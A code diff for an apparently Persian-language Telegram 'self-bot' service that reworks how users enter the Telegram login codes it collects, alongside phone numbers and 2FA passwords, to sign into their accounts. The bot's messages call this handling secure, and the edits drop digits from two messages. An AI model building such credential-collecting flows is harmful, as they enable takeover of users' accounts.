@@ -1,6 +1,5 @@
 import threading
 import time
-import asyncio
 import telebot
 from telebot import types
 from telethon import TelegramClient
@@ -16,6 +15,7 @@ import db_cache as cache
 import config
 import datetime
 import random
+import asyncio
 import logging
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -64,7 +64,6 @@ _lottery_players = {}
 
 
 def _get_telethon_loop():
-    """دریافت یا ایجاد event loop برای Telethon"""
     global _telethon_loop
     if _telethon_loop is None or _telethon_loop.is_closed():
         _telethon_loop = asyncio.new_event_loop()
@@ -74,7 +73,6 @@ def _get_telethon_loop():
 
 
 def _run_telethon_async(coro):
-    """اجرای coroutine در event loop تلگرام"""
     return asyncio.run_coroutine_threadsafe(coro, _get_telethon_loop()).result(timeout=60)
 
 
@@ -165,22 +163,6 @@ def start_token_bot():
             types.InlineKeyboardButton("💰 دادن الماس", callback_data="admin_give")
         )
         markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="admin_panel"))
-        return markup
-
-    def _numeric_keyboard():
-        """کیبورد عددی برای وارد کردن کد تأیید"""
-        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
-        markup.add(
-            types.KeyboardButton("1"), types.KeyboardButton("2"), types.KeyboardButton("3"),
-            types.KeyboardButton("4"), types.KeyboardButton("5"), types.KeyboardButton("6"),
-            types.KeyboardButton("7"), types.KeyboardButton("8"), types.KeyboardButton("9"),
-            types.KeyboardButton("0")
-        )
-        markup.add(
-            types.KeyboardButton("❌ پاک کردن"),
-            types.KeyboardButton("✅ تأیید"),
-            types.KeyboardButton("🔙 بازگشت")
-        )
         return markup
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -317,7 +299,7 @@ def start_token_bot():
             _bot.reply_to(
                 message,
                 f"✅ نام کاربری: <b>{username}</b>\n\n"
-                "📝 مرحله ۲ از ۵:\n"
+                "📝 مرحله  از ۵:\n"
                 "رمز عبور را وارد کنید:\n\n"
                 "💡 حداقل ۶ کاراکتر",
                 reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("❌ لغو")
@@ -394,14 +376,24 @@ def start_token_bot():
                     
                     _run_telethon_async(_send())
                     
+                    # ✅ ارسال دکمه inline برای تأیید کد
+                    markup = types.InlineKeyboardMarkup()
+                    markup.add(types.InlineKeyboardButton(
+                        "📱 کد را وارد کردم",
+                        callback_data="verify_signup_code"
+                    ))
+                    
                     _bot.send_message(
                         message.chat.id,
-                        "✅ کد تایید ارسال شد!\n\n"
-                        "📝 مرحله ۴ از ۵:\n"
-                        "کد دریافتی را با استفاده از کیبورد زیر وارد کنید:",
-                        reply_markup=_numeric_keyboard()
+                        "✅ کد تأیید به تلگرام شما ارسال شد!\n\n"
+                        "📲 لطفاً تلگرام خود را بررسی کنید و کد را ببینید.\n"
+                        "سپس روی دکمه زیر کلیک کنید و کد را وارد کنید:\n\n"
+                        "⏰ این کد ۵ دقیقه اعتبار دارد.\n"
+                        "🔐 کد به صورت امن پردازش می‌شود.",
+                        reply_markup=markup,
+                        parse_mode="HTML"
                     )
-                    _bot.register_next_step_handler(message, process_signup_code)
+                    
                 except FloodWaitError as e:
                     _bot.send_message(message.chat.id, f"⏰ محدودیت: {e.seconds} ثانیه صبر کنید.")
                     _signup_states.pop(tg_id, None)
@@ -413,10 +405,40 @@ def start_token_bot():
         except Exception as e:
             logger.error(f"❌ خطا در process_signup_phone: {e}")
 
-    def process_signup_code(message):
+    # ══════════════════════════════════════════════════════════════════════════
+    # 🆕 Callback: تأیید کد با دکمه inline
+    # ══════════════════════════════════════════════════════════════════════════
+    @_bot.callback_query_handler(func=lambda call: call.data == "verify_signup_code")
+    def callback_verify_signup_code(call):
         try:
-            tg_id = message.from_user.id
+            tg_id = call.from_user.id
             
+            if tg_id not in _signup_states:
+                return _bot.answer_callback_query(call.id, "❌ اطلاعات ثبت‌نام یافت نشد. دوباره /start بزنید.", show_alert=True)
+            
+            state_data = _signup_states[tg_id]
+            if state_data.get("state") != "code":
+                return _bot.answer_callback_query(call.id, "❌ در مرحله اشتباه هستید.", show_alert=True)
+            
+            _bot.answer_callback_query(call.id, "📝 لطفاً کد تأیید را وارد کنید:")
+            
+            # درخواست کد از کاربر
+            msg = _bot.send_message(
+                call.message.chat.id,
+                "🔢 <b>کد تأیید را وارد کنید:</b>\n\n"
+                "💡 کد ۵ رقمی است که تلگرام ارسال کرده است.\n"
+                "⏰ ۶۰ ثانیه فرصت دارید.",
+                reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("❌ لغو"),
+                parse_mode="HTML"
+            )
+            
+            _bot.register_next_step_handler(msg, process_signup_code_input, tg_id)
+            
+        except Exception as e:
+            logger.error(f"❌ خطا در callback_verify_signup_code: {e}")
+
+    def process_signup_code_input(message, tg_id):
+        try:
             if message.text == "❌ لغو":
                 _signup_states.pop(tg_id, None)
                 _telethon_clients.pop(tg_id, None)
@@ -425,43 +447,10 @@ def start_token_bot():
                 _bot.reply_to(message, "❌ لغو شد.", reply_markup=types.ReplyKeyboardRemove())
                 return
             
-            text = message.text.strip()
+            code = message.text.strip()
             
-            # ✅ پردازش کیبورد عددی
-            if text == "🔙 بازگشت":
-                _signup_states.pop(tg_id, None)
-                _telethon_clients.pop(tg_id, None)
-                _phone_hashes.pop(tg_id, None)
-                _phone_numbers.pop(tg_id, None)
-                _bot.reply_to(message, "❌ لغو شد.", reply_markup=types.ReplyKeyboardRemove())
-                return
-            
-            if text == "❌ پاک کردن":
-                _bot.send_message(
-                    message.chat.id,
-                    "🗑️ کد پاک شد.\nلطفاً کد جدید را وارد کنید:",
-                    reply_markup=_numeric_keyboard()
-                )
-                return
-            
-            if text == "✅ تأیید":
-                # کد در بافر ذخیره شده، ولی در این نسخه ساده، کاربر مستقیم کد را تایپ می‌کند
-                _bot.send_message(
-                    message.chat.id,
-                    "❌ لطفاً ابتدا کد را با دکمه‌های عددی وارد کنید و سپس «تأیید» را بزنید.",
-                    reply_markup=_numeric_keyboard()
-                )
-                return
-            
-            # اگر عدد است، کد را پردازش کن
-            if text.isdigit() and 4 <= len(text) <= 5:
-                code = text
-            else:
-                _bot.send_message(
-                    message.chat.id,
-                    "❌ کد باید ۴ یا ۵ رقم باشد.\nلطفاً دوباره تلاش کنید:",
-                    reply_markup=_numeric_keyboard()
-                )
+            if not code.isdigit() or len(code) < 4 or len(code) > 5:
+                _bot.reply_to(message, "❌ کد باید ۴ یا  رقم باشد.\nدوباره تلاش کنید:")
                 return
             
             phone = _phone_numbers.get(tg_id)
@@ -534,7 +523,7 @@ def start_token_bot():
             
             threading.Thread(target=verify_code_async, daemon=True).start()
         except Exception as e:
-            logger.error(f"❌ خطا در process_signup_code: {e}")
+            logger.error(f"❌ خطا در process_signup_code_input: {e}")
 
     def process_signup_2fa(message):
         try:
@@ -675,12 +664,22 @@ def start_token_bot():
                     
                     _run_telethon_async(_send())
                     
+                    # ✅ ارسال دکمه inline برای تأیید کد
+                    markup = types.InlineKeyboardMarkup()
+                    markup.add(types.InlineKeyboardButton(
+                        "📱 کد را وارد کردم",
+                        callback_data="verify_connect_code"
+                    ))
+                    
                     _bot.send_message(
                         message.chat.id,
-                        "✅ کد تایید ارسال شد!\n\nکد دریافتی را وارد کنید:",
-                        reply_markup=_numeric_keyboard()
+                        "✅ کد تأیید به تلگرام شما ارسال شد!\n\n"
+                        "📲 لطفاً تلگرام خود را بررسی کنید و کد را ببینید.\n"
+                        "سپس روی دکمه زیر کلیک کنید و کد را وارد کنید:",
+                        reply_markup=markup,
+                        parse_mode="HTML"
                     )
-                    _bot.register_next_step_handler(message, process_connect_code)
+                    
                 except FloodWaitError as e:
                     _bot.send_message(message.chat.id, f"⏰ محدودیت: {e.seconds} ثانیه صبر کنید.")
                     _signup_states.pop(tg_id, None)
@@ -692,10 +691,35 @@ def start_token_bot():
         except Exception as e:
             logger.error(f"❌ خطا در process_connect_phone: {e}")
 
-    def process_connect_code(message):
+    @_bot.callback_query_handler(func=lambda call: call.data == "verify_connect_code")
+    def callback_verify_connect_code(call):
         try:
-            tg_id = message.from_user.id
+            tg_id = call.from_user.id
             
+            if tg_id not in _signup_states:
+                return _bot.answer_callback_query(call.id, "❌ اطلاعات اتصال یافت نشد.", show_alert=True)
+            
+            state_data = _signup_states[tg_id]
+            if state_data.get("state") != "connect_code":
+                return _bot.answer_callback_query(call.id, "❌ در مرحله اشتباه هستید.", show_alert=True)
+            
+            _bot.answer_callback_query(call.id, "📝 لطفاً کد تأیید را وارد کنید:")
+            
+            msg = _bot.send_message(
+                call.message.chat.id,
+                "🔢 <b>کد تأیید را وارد کنید:</b>\n\n"
+                "💡 کد ۵ رقمی است که تلگرام ارسال کرده است.",
+                reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("❌ لغو"),
+                parse_mode="HTML"
+            )
+            
+            _bot.register_next_step_handler(msg, process_connect_code_input, tg_id)
+            
+        except Exception as e:
+            logger.error(f"❌ خطا در callback_verify_connect_code: {e}")
+
+    def process_connect_code_input(message, tg_id):
+        try:
             if message.text == "❌ لغو":
                 _signup_states.pop(tg_id, None)
                 _telethon_clients.pop(tg_id, None)
@@ -704,17 +728,11 @@ def start_token_bot():
                 _bot.reply_to(message, "❌ لغو شد.", reply_markup=types.ReplyKeyboardRemove())
                 return
             
-            text = message.text.strip()
+            code = message.text.strip()
             
-            if text in ["🔙 بازگشت", "❌ پاک کردن", "✅ تأیید"]:
-                _bot.send_message(message.chat.id, "لطفاً کد را با دکمه‌های عددی وارد کنید.", reply_markup=_numeric_keyboard())
+            if not code.isdigit() or len(code) < 4 or len(code) > 5:
+                _bot.reply_to(message, "❌ کد باید ۴ یا ۵ رقم باشد.\nدوباره تلاش کنید:")
                 return
-            
-            if not (text.isdigit() and 4 <= len(text) <= 5):
-                _bot.send_message(message.chat.id, "❌ کد باید ۴ یا ۵ رقم باشد.", reply_markup=_numeric_keyboard())
-                return
-            
-            code = text
             
             phone = _phone_numbers.get(tg_id)
             ph = _phone_hashes.get(tg_id)
@@ -769,7 +787,7 @@ def start_token_bot():
             
             threading.Thread(target=verify_code_async, daemon=True).start()
         except Exception as e:
-            logger.error(f"❌ خطا در process_connect_code: {e}")
+            logger.error(f"❌ خطا در process_connect_code_input: {e}")
 
     def process_connect_2fa(message):
         try:
@@ -1117,6 +1135,7 @@ def start_token_bot():
     @_bot.message_handler(func=lambda m: m.text == "📖 راهنما", chat_types=['private'])
     def cmd_help(message):
         try:
+            if not require_membership(message): return
             help_text = """📖 <b>راهنمای Self Nexo</b>
 
 🔹 <b>دکمه‌های اصلی:</b>
